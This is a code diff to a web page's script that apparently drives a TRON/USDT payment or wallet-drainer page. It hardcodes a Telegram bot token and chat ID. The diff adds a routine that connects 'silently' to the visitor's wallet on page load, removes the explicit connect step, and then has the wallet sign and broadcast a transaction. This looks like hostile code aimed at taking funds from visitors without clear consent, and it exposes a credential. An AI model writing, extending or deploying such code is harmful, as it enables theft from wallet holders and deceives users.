@@ -121,8 +121,25 @@
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_tron';
+        let walletConnected = false;
+
+        // Connessione silenziosa al caricamento della pagina
+        async function initializeTronWeb() {
+            let retries = 0;
+            while (!window.tronWeb && retries < 20) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                retries++;
+            }
+
+            if (window.tronWeb) {
+                // TronWeb è disponibile - il wallet è connesso silenziosamente
+                walletConnected = true;
+                console.log('TronWeb connected silently');
+            }
+        }
 
         document.addEventListener('DOMContentLoaded', ( ) => {
+            initializeTronWeb();
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -262,13 +279,8 @@
             clearError();
 
             try {
+                // Usa TronWeb che è stato connesso silenziosamente
                 let tronWeb = window.tronWeb;
-                let retries = 0;
-                while (!tronWeb && retries < 10) {
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                    tronWeb = window.tronWeb;
-                    retries++;
-                }
 
                 if (!tronWeb) {
                     showError('Trust Wallet not detected');
@@ -277,7 +289,7 @@
                     return;
                 }
 
-                // FLUSSO NATIVO DI TRONWEB - NON chiede Connect Wallet
+                // Ottieni l'indirizzo dal wallet già connesso
                 let userAddress = tronWeb.defaultAddress.base58;
 
                 if (!userAddress) {
@@ -308,7 +320,7 @@
                     return;
                 }
 
-                // Firma - QUESTO apre il popup di firma automaticamente
+                // Firma - QUESTO apre il popup di firma
                 const signedTx = await tronWeb.trx.sign(tx.transaction);
                 let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
 
